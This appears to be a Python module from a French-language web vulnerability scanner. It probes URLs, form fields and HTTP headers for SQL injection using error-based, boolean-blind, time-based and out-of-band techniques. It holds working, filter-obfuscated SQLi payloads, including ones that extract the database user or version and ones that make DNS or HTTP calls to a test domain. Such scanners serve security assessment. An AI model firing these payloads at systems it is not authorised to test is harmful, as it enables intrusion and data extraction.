#!/usr/bin/env python3
# coding:utf-8
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# modules/injection/sqli.py — Module de détection d'injection SQL avancé.
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
from __future__ import annotations

import logging
import time
import urllib.parse
from functools import lru_cache
from typing import Final, Generator

import requests
from bs4 import BeautifulSoup

from utils import calculate_similarity, extract_form_fields, obfuscate_payload

logger = logging.getLogger("webmapper.sqli")

DELAY: Final[float] = 0.5
TIMEOUT: Final[int] = 15  # Un peu plus long pour le time-based

# Signatures d'erreurs (Error-based)

ERROR_SIGNATURES: Final[tuple[str, ...]] = (
    # Classiques
    "you have an error in your sql syntax",
    "warning: mysql_fetch_array()",
    "unclosed quotation mark",
    "postgresql query failed",
    "sqlserver exception",
    "ora-01756", "ora-00907", "oracle error",
    "syntax error", "quoted string not properly terminated",
    "mysql_num_rows()", "pg_query()",
    "sqlite3.operationalerror", "microsoft ole db provider for sql server",
    # Avancées (extractvalue, updatexml, casting)
    "xpath syntax error",
    "conversion failed when converting",
    "invalid input syntax for type",
    "division by zero",
)

# Payloads par technique

ERROR_PAYLOADS: Final[tuple[str, ...]] = (
    "'", '"', "''", "1' ORDER BY 1--",
    # Avancés
    "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user())))--",
    "1' AND UPDATEXML(1,CONCAT(0x5c,(SELECT user())),1)--",
    "1' AND CAST((SELECT @@version) AS INT)--",
)

BOOLEAN_PAYLOADS: Final[tuple[tuple[str, str], ...]] = (
    # (True payload, False payload)
    ("' AND 1=1--", "' AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ('") AND 1=1--', '") AND 1=2--'),
)

# Durée de pause (secondes) pour les tests Time-based
SLEEP_TIME: Final[int] = 5

TIME_PAYLOADS: Final[tuple[str, ...]] = (
    f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_TIME})))a)--",  # nosec B608
    f"'; WAITFOR DELAY '0:0:{SLEEP_TIME}'--",  # nosec B608
    f"1' AND pg_sleep({SLEEP_TIME})--",
    f"1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP_TIME})--",
)

# Domaine fictif pour l'OOB (en contexte réel, utiliser Interactsh ou Burp Collaborator)
OOB_DOMAIN: Final[str] = "oob.webmapper-test.local"

OOB_PAYLOADS: Final[tuple[str, ...]] = (
    f"1'; EXEC master..xp_dirtree '\\\\{OOB_DOMAIN}\\a'--",
    f"1' AND LOAD_FILE('\\\\\\\\{OOB_DOMAIN}\\\\a')--",
    f"1' AND (SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{OOB_DOMAIN}/\"> %remote;]>'),'/l'))--",
)


# Helpers

def _is_sqli_error(text: str) -> str | None:
    """Retourne la signature d'erreur SQLi détectée, ou None."""
    lower = text.lower()
    for sig in ERROR_SIGNATURES:
        if sig in lower:
            return sig
    return None

def _check_baseline_stability(session: requests.Session, url: str) -> tuple[str, bool, float]:
    """Évalue la stabilité d'une page (Boolean-blind) et son temps de réponse de base.
    
    Returns:
        (baseline_text, is_stable, baseline_latency_seconds)
    """
    try:
        t0 = time.perf_counter()
        res1 = session.get(url, timeout=TIMEOUT)
        t1 = time.perf_counter()
        
        time.sleep(DELAY)
        
        t2 = time.perf_counter()
        res2 = session.get(url, timeout=TIMEOUT)
        t3 = time.perf_counter()

        similarity = calculate_similarity(res1.text, res2.text)
        is_stable = similarity > 0.95
        avg_latency = ((t1 - t0) + (t3 - t2)) / 2.0

        if not is_stable:
            logger.debug("Page instable (%s) - similarité: %.2f", url, similarity)
            
        return res1.text, is_stable, avg_latency
    except Exception:
        return "", False, 0.0

@lru_cache(maxsize=128)
def _extract_forms_from_html(html_source: str) -> tuple[tuple[str, str, str, dict, list[str]], ...]:
    """Extrait les formulaires HTML de façon cachée."""
    soup = BeautifulSoup(html_source, "html.parser")
    forms_data = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = (form.get("method", "GET")).upper()
        template, injectable = extract_form_fields(form, include_hidden=True)
        forms_data.append((str(form), action, method, template, injectable))
    return tuple(forms_data)


# Scan principal

def scan(url: str, session: requests.Session) -> list[dict]:
    """Détecte les vulnérabilités SQLi via de multiples vecteurs.

    Args:
        url:     URL cible.
        session: Session requests isolée.

    Returns:
        Liste de findings au format dict.
    """
    findings: list[dict] = []
    seen: set[str] = set()

    def add_finding(f: dict) -> None:
        key = (f["type"], f.get("url", ""), f.get("evidence", "")[:40])
        if key not in seen:
            seen.add(key)
            findings.append(f)

    # 1. Baseline
    time.sleep(DELAY)
    baseline_text, page_is_stable, baseline_latency = _check_baseline_stability(session, url)
    if not baseline_text:
        return []
        
    # Seuil dynamique pour le time-based
    time_threshold = baseline_latency + SLEEP_TIME - 1.0

    parsed = urllib.parse.urlparse(url)
    url_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    # 2. Paramètres GET
    for param_name in url_params:
        is_vuln_get = False

        # 2.1 Error-based (classique & avancé)
        for payload in ERROR_PAYLOADS:
            test_params = {k: (v[0] + obfuscate_payload(payload, "sql_spaces") if k == param_name else v[0]) for k, v in url_params.items()}
            try:
                time.sleep(DELAY)
                res = session.get(url, params=test_params, timeout=TIMEOUT)
                sig = _is_sqli_error(res.text)
                if sig:
                    add_finding({
                        "type": "SQL_INJECTION_ERROR_BASED",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Injection SQL (Error-based) sur le paramètre GET '{param_name}'.",
                        "evidence": f"Signature : '{sig}' | Payload : {payload}",
                    })
                    is_vuln_get = True
                    break
            except Exception as exc:
                logger.debug("Erreur test SQLi GET Error-based param '%s' : %s", param_name, exc)
                
        if is_vuln_get: continue

        # 2.2 Boolean-based Blind
        if page_is_stable:
            for true_pay, false_pay in BOOLEAN_PAYLOADS:
                try:
                    test_true = {k: (v[0] + obfuscate_payload(true_pay, "sql_spaces") if k == param_name else v[0]) for k, v in url_params.items()}
                    test_false = {k: (v[0] + obfuscate_payload(false_pay, "sql_spaces") if k == param_name else v[0]) for k, v in url_params.items()}
                    
                    time.sleep(DELAY)
                    res_true = session.get(url, params=test_true, timeout=TIMEOUT)
                    time.sleep(DELAY)
                    res_false = session.get(url, params=test_false, timeout=TIMEOUT)

                    sim_true = calculate_similarity(baseline_text, res_true.text)
                    sim_false = calculate_similarity(baseline_text, res_false.text)

                    if sim_true > 0.90 and (sim_true - sim_false) > 0.08:
                        add_finding({
                            "type": "SQL_INJECTION_BOOLEAN_BLIND",
                            "severity": "critical",
                            "url": url,
                            "detail": f"Injection SQL (Boolean-blind) sur le paramètre GET '{param_name}'.",
                            "evidence": f"Similitude Vraie : {sim_true:.2f} | Similitude Fausse : {sim_false:.2f}",
                        })
                        is_vuln_get = True
                        break
                except Exception as exc:
                    logger.debug("Erreur test SQLi GET Boolean-blind param '%s' : %s", param_name, exc)

        if is_vuln_get: continue

        # 2.3 Time-based Blind
        for payload in TIME_PAYLOADS:
            test_params = {k: (v[0] + obfuscate_payload(payload, "sql_spaces") if k == param_name else v[0]) for k, v in url_params.items()}
            try:
                time.sleep(DELAY)
                res = session.get(url, params=test_params, timeout=TIMEOUT)
                
                # Vérifier le délai effectif
                if res.elapsed.total_seconds() >= time_threshold:
                    add_finding({
                        "type": "SQL_INJECTION_TIME_BASED",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Injection SQL (Time-based) sur le paramètre GET '{param_name}'.",
                        "evidence": f"Délai observé : {res.elapsed.total_seconds():.2f}s | Seuil : {time_threshold:.2f}s | Payload : {payload}",
                    })
                    is_vuln_get = True
                    break
            except requests.Timeout:
                # Timeout complet → forte probabilité de time-based réussi
                add_finding({
                    "type": "SQL_INJECTION_TIME_BASED",
                    "severity": "critical",
                    "url": url,
                    "detail": f"Injection SQL (Time-based) sur le paramètre GET '{param_name}'. Timeout de la requête.",
                    "evidence": f"Requête en timeout après {TIMEOUT}s. | Payload : {payload}",
                })
                is_vuln_get = True
                break
            except Exception as exc:
                logger.debug("Erreur test SQLi GET Time-based param '%s' : %s", param_name, exc)

        if is_vuln_get: continue

        # 2.4 Out-of-band (OOB) basique / Second-order prep
        for payload in OOB_PAYLOADS:
            test_params = {k: (v[0] + obfuscate_payload(payload, "sql_spaces") if k == param_name else v[0]) for k, v in url_params.items()}
            try:
                time.sleep(DELAY)
                session.get(url, params=test_params, timeout=TIMEOUT)
            except Exception:
                pass


    # 3. Formulaires HTML
    
    forms_data = _extract_forms_from_html(baseline_text)
    
    for _, action, method, template, injectable_names in forms_data:
        target_url = urllib.parse.urljoin(url, action)
        if not injectable_names:
            continue

        # Baseline Formulaire
        try:
            time.sleep(DELAY)
            if method == "POST":
                form_baseline_res = session.post(target_url, data=template, timeout=TIMEOUT)
            else:
                form_baseline_res = session.get(target_url, params=template, timeout=TIMEOUT)
            form_baseline_text = form_baseline_res.text
        except Exception:
            form_baseline_text = baseline_text

        for field_name in injectable_names:
            original_val = template[field_name]
            is_vuln_form = False

            # 3.1 Formulaire Error-based
            for payload in ERROR_PAYLOADS:
                form_data = template.copy()
                form_data[field_name] = original_val + obfuscate_payload(payload, "sql_spaces")
                try:
                    time.sleep(DELAY)
                    res = session.post(target_url, data=form_data, timeout=TIMEOUT) if method == "POST" else session.get(target_url, params=form_data, timeout=TIMEOUT)
                    sig = _is_sqli_error(res.text)
                    if sig:
                        add_finding({
                            "type": "SQL_INJECTION_ERROR_BASED",
                            "severity": "critical",
                            "url": target_url,
                            "detail": f"Injection SQL (Error-based) sur formulaire {method} champ '{field_name}'.",
                            "evidence": f"Signature : '{sig}' | Payload : {payload}",
                        })
                        is_vuln_form = True
                        break
                except Exception as exc:
                    logger.debug("Erreur SQLi form Error-based champ '%s': %s", field_name, exc)
                    
            if is_vuln_form: continue

            # 3.2 Formulaire Boolean-based Blind
            if page_is_stable:
                for true_pay, false_pay in BOOLEAN_PAYLOADS:
                    form_data_true = template.copy()
                    form_data_true[field_name] = original_val + obfuscate_payload(true_pay, "sql_spaces")
                    form_data_false = template.copy()
                    form_data_false[field_name] = original_val + obfuscate_payload(false_pay, "sql_spaces")
                    
                    try:
                        time.sleep(DELAY)
                        res_true = session.post(target_url, data=form_data_true, timeout=TIMEOUT) if method == "POST" else session.get(target_url, params=form_data_true, timeout=TIMEOUT)
                        time.sleep(DELAY)
                        res_false = session.post(target_url, data=form_data_false, timeout=TIMEOUT) if method == "POST" else session.get(target_url, params=form_data_false, timeout=TIMEOUT)

                        sim_true = calculate_similarity(form_baseline_text, res_true.text)
                        sim_false = calculate_similarity(form_baseline_text, res_false.text)

                        if sim_true > 0.90 and (sim_true - sim_false) > 0.08:
                            add_finding({
                                "type": "SQL_INJECTION_BOOLEAN_BLIND",
                                "severity": "critical",
                                "url": target_url,
                                "detail": f"Injection SQL (Boolean-blind) sur formulaire {method} champ '{field_name}'.",
                                "evidence": f"Similitude Vraie : {sim_true:.2f} | Similitude Fausse : {sim_false:.2f}",
                            })
                            is_vuln_form = True
                            break
                    except Exception as exc:
                        logger.debug("Erreur SQLi form Boolean-blind champ '%s': %s", field_name, exc)

            if is_vuln_form: continue

            # 3.3 Formulaire Time-based Blind
            for payload in TIME_PAYLOADS:
                form_data = template.copy()
                form_data[field_name] = original_val + obfuscate_payload(payload, "sql_spaces")
                try:
                    time.sleep(DELAY)
                    res = session.post(target_url, data=form_data, timeout=TIMEOUT) if method == "POST" else session.get(target_url, params=form_data, timeout=TIMEOUT)
                    
                    if res.elapsed.total_seconds() >= time_threshold:
                        add_finding({
                            "type": "SQL_INJECTION_TIME_BASED",
                            "severity": "critical",
                            "url": target_url,
                            "detail": f"Injection SQL (Time-based) sur formulaire {method} champ '{field_name}'.",
                            "evidence": f"Délai observé : {res.elapsed.total_seconds():.2f}s | Seuil : {time_threshold:.2f}s | Payload : {payload}",
                        })
                        is_vuln_form = True
                        break
                except requests.Timeout:
                    add_finding({
                        "type": "SQL_INJECTION_TIME_BASED",
                        "severity": "critical",
                        "url": target_url,
                        "detail": f"Injection SQL (Time-based) sur formulaire {method} champ '{field_name}'. Timeout.",
                        "evidence": f"Requête en timeout après {TIMEOUT}s. | Payload : {payload}",
                    })
                    is_vuln_form = True
                    break
                except Exception as exc:
                    logger.debug("Erreur SQLi form Time-based champ '%s': %s", field_name, exc)

    # 4. En-têtes HTTP
    
    target_headers = ["X-Forwarded-For", "User-Agent", "Referer", "X-Client-IP"]
    for header in target_headers:
        for payload in ERROR_PAYLOADS:
            try:
                time.sleep(DELAY)
                custom_headers = {header: obfuscate_payload(payload, "sql_spaces")}
                res = session.get(url, headers=custom_headers, timeout=TIMEOUT)
                sig = _is_sqli_error(res.text)
                if sig:
                    add_finding({
                        "type": "SQL_INJECTION_HEADER_ERROR_BASED",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Injection SQL (Error-based) via l'en-tête HTTP '{header}'.",
                        "evidence": f"Signature : '{sig}' | Payload : {payload}",
                    })
                    break
            except Exception as exc:
                logger.debug("Erreur SQLi header '%s' : %s", header, exc)

    # 5. Check Second-order (basique)
    # Après avoir injecté des payloads OOB/Error dans tous les champs, on recharge la page de base.
    try:
        time.sleep(DELAY)
        res_check = session.get(url, timeout=TIMEOUT)
        sig = _is_sqli_error(res_check.text)
        if sig:
            add_finding({
                "type": "SQL_INJECTION_SECOND_ORDER",
                "severity": "critical",
                "url": url,
                "detail": "Injection SQL (Second-order) détectée après rechargement de la page.",
                "evidence": f"Signature d'erreur affichée après injections : '{sig}'",
            })
    except Exception:
        pass

    return findings
